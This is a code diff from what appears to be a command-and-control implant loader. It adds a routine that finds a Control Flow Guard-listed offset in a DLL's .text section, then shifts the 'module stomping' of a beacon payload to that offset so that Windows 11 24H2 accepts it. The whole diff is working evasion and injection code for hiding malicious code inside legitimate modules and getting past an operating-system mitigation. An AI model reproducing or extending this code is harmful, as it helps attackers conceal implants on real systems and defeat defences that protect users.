@@ -40,6 +40,44 @@ FUNC VOID NaxPatchLdr( PVOID DllBase ) {
     }
 }
 
+/* ========= [ GFIDS scan — find first CFG-valid offset in .text ] =========
+ *
+ * Win11 24H2 refuses SetProcessValidCallTargets for offsets not present
+ * in the image's Guard Function IDs table.  Placing the beacon at a
+ * GFIDS-listed RVA lets the kernel accept the whitelist request. */
+
+#define LCDIR_GFIDS_TABLE_OFF   0x80  /* IMAGE_LOAD_CONFIG_DIRECTORY64.GuardCFFunctionTable  (VA)  */
+#define LCDIR_GFIDS_COUNT_OFF   0x88  /* IMAGE_LOAD_CONFIG_DIRECTORY64.GuardCFFunctionCount        */
+#define LCDIR_GUARD_FLAGS_OFF   0x90  /* IMAGE_LOAD_CONFIG_DIRECTORY64.GuardFlags                  */
+#define LCDIR_MIN_SIZE          0x94  /* minimum Size to contain the guard fields                  */
+
+FUNC ULONG NaxFindGfidsEntry( PVOID DllBase, PIMAGE_NT_HEADERS Nt, ULONG TextRva, ULONG TextSize ) {
+    PIMAGE_DATA_DIRECTORY LcDir = &Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
+    if ( !LcDir->VirtualAddress )
+        return 0;
+
+    PUCHAR LcBase = A_PTR( U_PTR( DllBase ) + LcDir->VirtualAddress );
+    ULONG  LcSize = C_DEF32( LcBase );
+    if ( LcSize < LCDIR_MIN_SIZE )
+        return 0;
+
+    PVOID GfidsTable = C_DEF( C_PTR( U_PTR( LcBase ) + LCDIR_GFIDS_TABLE_OFF ) );
+    ULONG GfidsCount = C_DEF32( C_PTR( U_PTR( LcBase ) + LCDIR_GFIDS_COUNT_OFF ) );
+    ULONG GuardFlags = C_DEF32( C_PTR( U_PTR( LcBase ) + LCDIR_GUARD_FLAGS_OFF ) );
+    ULONG Stride     = 4 + ( ( GuardFlags >> 28 ) & 0xF );
+
+    if ( !GfidsTable || !GfidsCount )
+        return 0;
+
+    for ( ULONG i = 0; i < GfidsCount; i++ ) {
+        ULONG Rva = C_DEF32( C_PTR( U_PTR( GfidsTable ) + i * Stride ) );
+        if ( Rva >= TextRva && Rva < TextRva + TextSize )
+            return Rva - TextRva;
+    }
+
+    return 0;
+}
+
 /* ========= [ stomp beacon into DLL .text ] ========= */
 
 FUNC PVOID NaxModuleStomp(
@@ -72,11 +110,19 @@ FUNC PVOID NaxModuleStomp(
 
     /* ========= [ find .text section (code, execute) ] ========= */
     PIMAGE_SECTION_HEADER TextSec = NaxFindSection( Nt, IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE );
-    if ( !TextSec || TextSec->SizeOfRawData < BeaconSize )
+    if ( !TextSec )
         return NULL;
 
-    PVOID TextBase = C_PTR( U_PTR( DllBase ) + TextSec->VirtualAddress );
     ULONG DllTextRva = TextSec->VirtualAddress;
+    PVOID TextBase   = C_PTR( U_PTR( DllBase ) + DllTextRva );
+
+    /* ========= [ align entry to a GFIDS-valid offset ] ========= */
+    ULONG GfidsSkip = NaxFindGfidsEntry( DllBase, Nt, DllTextRva, TextSec->SizeOfRawData );
+
+    if ( TextSec->SizeOfRawData < BeaconSize + GfidsSkip )
+        return NULL;
+
+    PVOID EntryBase = C_PTR( U_PTR( TextBase ) + GfidsSkip );
 
     /* ========= [ save clean .text before stomping ] ========= */
     PVOID CleanTextBuf = API( RtlAllocateHeap )( NtCurrentPeb()->ProcessHeap, 0, TextSec->SizeOfRawData );
@@ -89,11 +135,11 @@ FUNC PVOID NaxModuleStomp(
     if ( CleanTextBuf )
         MmCopy( CleanTextBuf, TextBase, TextSec->SizeOfRawData );
 
-    MmCopy( TextBase, BeaconSrc, BeaconSize );
+    MmCopy( EntryBase, BeaconSrc, BeaconSize );
 
     /* ========= [ write stomp context tag after beacon code ] ========= */
-    if ( CleanTextBuf && TextSec->SizeOfRawData >= BeaconSize + 4 + sizeof( PVOID ) + sizeof( ULONG ) ) {
-        PBYTE pTag = (PBYTE)TextBase + BeaconSize;
+    if ( CleanTextBuf && TextSec->SizeOfRawData >= GfidsSkip + BeaconSize + 4 + sizeof( PVOID ) + sizeof( ULONG ) ) {
+        PBYTE pTag = (PBYTE)EntryBase + BeaconSize;
         ULONG magic = NAX_STOMP_CTX_MAGIC;
         ULONG cleanSize = TextSec->SizeOfRawData;
         MmCopy( pTag,                              &magic,        sizeof( ULONG ) );
@@ -124,8 +170,8 @@ FUNC PVOID NaxModuleStomp(
                 PRUNTIME_FUNCTION Entries = (PRUNTIME_FUNCTION)PdataBase;
 
                 for ( ULONG i = 0; i < EntryCount; i++ ) {
-                    Entries[i].BeginAddress += DllTextRva;
-                    Entries[i].EndAddress   += DllTextRva;
+                    Entries[i].BeginAddress += DllTextRva + GfidsSkip;
+                    Entries[i].EndAddress   += DllTextRva + GfidsSkip;
                     Entries[i].UnwindData   += XdataRva;
                 }
 
@@ -144,7 +190,7 @@ FUNC PVOID NaxModuleStomp(
         }
     }
 
-    return TextBase;
+    return EntryBase;
 }
 
 #endif /* NAX_STOMP_MODULE */
